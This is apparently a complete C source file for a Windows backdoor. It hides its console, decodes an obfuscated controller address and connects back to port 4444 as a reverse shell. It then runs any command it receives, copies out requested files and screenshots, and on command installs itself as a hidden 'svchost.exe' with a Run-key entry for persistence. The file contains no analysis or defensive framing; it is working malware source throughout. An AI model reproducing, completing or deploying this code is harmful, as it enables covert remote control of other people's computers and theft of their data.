#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <stdint.h>

#define bzero(p, size) (void) memset((p), 0, (size))
#define BUFFER_SIZE 8192

int sock;
char ip_[] = "MTkyLjE2OC4xLjg=";

char* base64_decode(const char *input) {
    char *output;
    const char *base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int i = 0;
    int in = 0;
    unsigned char char_array_4[4];
    unsigned char char_array_3[3];
    int output_len = 0;
    
    int input_len = (int)strlen(input);
    int estimated_len = (input_len / 4) * 3 + 3;
    output = (char*)malloc(estimated_len + 1);
    if (!output) return NULL;
    
    memset(output, 0, (size_t)(estimated_len + 1));
    
    while (input[in] && input[in] != '=') {
        char_array_4[i++] = (unsigned char)input[in];
        in++;
        
        if (i == 4) {
            for (i = 0; i < 4; i++) {
                char *ptr = strchr(base64_chars, (char)char_array_4[i]);
                if (ptr) {
                    char_array_4[i] = (unsigned char)(ptr - base64_chars);
                } else {
                    char_array_4[i] = 0;
                }
            }
            
            char_array_3[0] = (unsigned char)((char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4));
            char_array_3[1] = (unsigned char)(((char_array_4[1] & 0x0f) << 4) + ((char_array_4[2] & 0x3c) >> 2));
            char_array_3[2] = (unsigned char)(((char_array_4[2] & 0x03) << 6) + char_array_4[3]);
            
            for (i = 0; i < 3; i++) {
                output[output_len++] = (char)char_array_3[i];
            }
            i = 0;
        }
    }
    
    if (i) {
        for (int k = i; k < 4; k++) {
            char_array_4[k] = 0;
        }
        
        for (int k = 0; k < 4; k++) {
            char *ptr = strchr(base64_chars, (char)char_array_4[k]);
            if (ptr) {
                char_array_4[k] = (unsigned char)(ptr - base64_chars);
            } else {
                char_array_4[k] = 0;
            }
        }
        
        char_array_3[0] = (unsigned char)((char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4));
        char_array_3[1] = (unsigned char)(((char_array_4[1] & 0x0f) << 4) + ((char_array_4[2] & 0x3c) >> 2));
        char_array_3[2] = (unsigned char)(((char_array_4[2] & 0x03) << 6) + char_array_4[3]);
        
        for (int k = 0; k < i - 1; k++) {
            output[output_len++] = (char)char_array_3[k];
        }
    }
    
    output[output_len] = '\0';
    return output;
}

int bootRun()
{
    char appdata_path[MAX_PATH];
    char exe_path[MAX_PATH];
    char dest_path[MAX_PATH];
    char response[1024];
    
    GetModuleFileName(NULL, exe_path, MAX_PATH);
    GetEnvironmentVariable("APPDATA", appdata_path, MAX_PATH);
    
    snprintf(dest_path, sizeof(dest_path), "%s\\svchost.exe", appdata_path);
    
    CopyFile(exe_path, dest_path, FALSE);
    SetFileAttributes(dest_path, FILE_ATTRIBUTE_HIDDEN);
    
    HKEY NewVal;
    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) == ERROR_SUCCESS) {
        DWORD pathLenInBytes = strlen(dest_path) * sizeof(char);
        if (RegSetValueEx(NewVal, TEXT("svchost"), 0, REG_SZ, (LPBYTE)dest_path, pathLenInBytes) == ERROR_SUCCESS) {
            snprintf(response, sizeof(response), "Persistence created at: %s\n", dest_path);
            send(sock, response, strlen(response), 0);
        } else {
            char err[] = "Failed to create persistence\n";
            send(sock, err, sizeof(err), 0);
        }
        RegCloseKey(NewVal);
    } else {
        char err[] = "Failed to open registry key\n";
        send(sock, err, sizeof(err), 0);
    }
    
    return 0;
}

char *str_cut(char str[], int slice_from, int slice_to)
{
    if (str[0] == '\0')
        return NULL;

    char *buffer;
    size_t str_len, buffer_len;

    if (slice_to < 0 && slice_from > slice_to) {
        str_len = strlen(str);
        if (abs(slice_to) > str_len - 1)
            return NULL;

        if (abs(slice_from) > str_len)
            slice_from = (-1) * str_len;

        buffer_len = slice_to - slice_from;
        str += (str_len + slice_from);

    } else if (slice_from >= 0 && slice_to > slice_from) {
        str_len = strlen(str);

        if (slice_from > str_len - 1)
            return NULL;
        buffer_len = slice_to - slice_from;
        str += slice_from;

    } else
        return NULL;

    buffer = calloc(buffer_len, sizeof(char));
    strncpy(buffer, str, buffer_len);
    return buffer;
}

void trim_newline(char *str) {
    size_t len = strlen(str);
    if (len > 0 && str[len-1] == '\n') {
        str[len-1] = '\0';
    }
}

void send_file(const char *filename) {
    FILE *file;
    char buffer[BUFFER_SIZE];
    size_t bytes_read;
    uint64_t filesize;
    uint32_t nameLen;
    
    file = fopen(filename, "rb");
    if (file == NULL) {
        char response[1024];
        snprintf(response, sizeof(response), "Erro: file not found '%s'\n", filename);
        send(sock, response, strlen(response), 0);
        return;
    }
    
    fseek(file, 0, SEEK_END);
    filesize = ftell(file);
    fseek(file, 0, SEEK_SET);
    
    nameLen = strlen(filename);
    
    send(sock, (char *)&nameLen, sizeof(nameLen), 0);
    send(sock, filename, nameLen, 0);
    send(sock, (char *)&filesize, sizeof(filesize), 0);
    
    while ((bytes_read = fread(buffer, 1, sizeof(buffer), file)) > 0) {
        send(sock, buffer, bytes_read, 0);
    }
    
    fclose(file);
}

void send_screenshot() {
    HDC hdcScreen = GetDC(NULL);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
    
    BITMAPINFO bi = {0};
    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = width;
    bi.bmiHeader.biHeight = -height;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 24;
    bi.bmiHeader.biCompression = BI_RGB;
    
    DWORD image_size = width * height * 3;
    DWORD total_size = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + image_size;
    char *data = malloc(total_size);
    char *pixels = malloc(image_size);
    
    GetDIBits(hdcScreen, hBitmap, 0, height, pixels, &bi, DIB_RGB_COLORS);
    
    BITMAPFILEHEADER bf = {0};
    bf.bfType = 0x4D42;
    bf.bfSize = total_size;
    bf.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    
    memcpy(data, &bf, sizeof(BITMAPFILEHEADER));
    memcpy(data + sizeof(BITMAPFILEHEADER), &bi.bmiHeader, sizeof(BITMAPINFOHEADER));
    memcpy(data + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), pixels, image_size);
    
    uint32_t nameLen = 12;
    char filename[] = "screenshot.bmp";
    uint64_t filesize = total_size;
    
    send(sock, (char *)&nameLen, sizeof(nameLen), 0);
    send(sock, filename, nameLen, 0);
    send(sock, (char *)&filesize, sizeof(filesize), 0);
    send(sock, data, total_size, 0);
    
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
    free(data);
    free(pixels);
}

void Shell() {
    char buffer[1024];
    char container[1024];
    char total_response[18384];
    int bytes_received;
    char *ip = base64_decode(ip_);

    while (1) {
        bytes_received = recv(sock, buffer, 1, MSG_PEEK);
        if (bytes_received == SOCKET_ERROR || bytes_received == 0) {
            closesocket(sock);
            
            struct sockaddr_in ServAddr;
            WSADATA wsaData;
            
            WSAStartup(MAKEWORD(2,0), &wsaData);
            sock = socket(AF_INET, SOCK_STREAM, 0);
            
            memset(&ServAddr, 0, sizeof(ServAddr));
            ServAddr.sin_family = AF_INET;
            ServAddr.sin_addr.s_addr = inet_addr(ip);
            ServAddr.sin_port = htons(4444);
            
            while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
                Sleep(10000);
            }
            
            continue;
        }

        bzero(buffer,1024);
        bzero(container, sizeof(container));
        bzero(total_response, sizeof(total_response));
        
        bytes_received = recv(sock, buffer, 1024, 0);
        if (bytes_received <= 0) {
            closesocket(sock);
            struct sockaddr_in ServAddr;
            WSADATA wsaData;
            
            WSAStartup(MAKEWORD(2,0), &wsaData);
            sock = socket(AF_INET, SOCK_STREAM, 0);
            
            memset(&ServAddr, 0, sizeof(ServAddr));
            ServAddr.sin_family = AF_INET;
            ServAddr.sin_addr.s_addr = inet_addr(ip);
            ServAddr.sin_port = htons(4444);
            
            while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
                Sleep(10000);
            }
            continue;
        }

        trim_newline(buffer);

        if (strncmp("q", buffer, 1) == 0) {
            closesocket(sock);
            WSACleanup();
            exit(0);
        }
        else if (strncmp("cd ", buffer, 3) == 0) {
            chdir(str_cut(buffer,3,100));
            char response[] = "dir changed\n";
            send(sock, response, strlen(response), 0);
        }
        else if (strncmp("persist", buffer, 7) == 0) {
            bootRun();
        }
        else if (strncmp("copy ", buffer, 5) == 0) {
            char *filename = str_cut(buffer, 5, 100);
            if (filename != NULL) {
                send_file(filename);
                char response[1024];
                snprintf(response, sizeof(response), "file '%s' sent\n", filename);
                send(sock, response, strlen(response), 0);
                free(filename);
            } else {
                char error_msg[] = "Erro: invalid file\n";
                send(sock, error_msg, strlen(error_msg), 0);
            }
        }
        else if (strncmp("prtsc", buffer, 5) == 0) {
            send_screenshot();
            char response[] = "screenshot sent\n";
            send(sock, response, strlen(response), 0);
        }
        else {
            FILE *fp;
            fp = _popen(buffer, "r");
            if (fp != NULL) {
                while(fgets(container,1024,fp) != NULL) {
                    strcat(total_response, container);
                }
                send(sock, total_response, strlen(total_response), 0);
                fclose(fp);
            } else {
                char error_msg[] = "command not found\n";
                send(sock, error_msg, strlen(error_msg), 0);
            }
        }
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);

    struct sockaddr_in ServAddr;
    WSADATA wsaData;
    char *ip = base64_decode(ip_);

    if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
        exit(1);
    }

    while (1) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        
        memset(&ServAddr, 0, sizeof(ServAddr));
        ServAddr.sin_family = AF_INET;
        ServAddr.sin_addr.s_addr = inet_addr(ip);
        ServAddr.sin_port = htons(4444);

        while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
            Sleep(10000);
        }

        Shell();
        
        closesocket(sock);
        Sleep(10000);
    }

    WSACleanup();
    return 0;
}
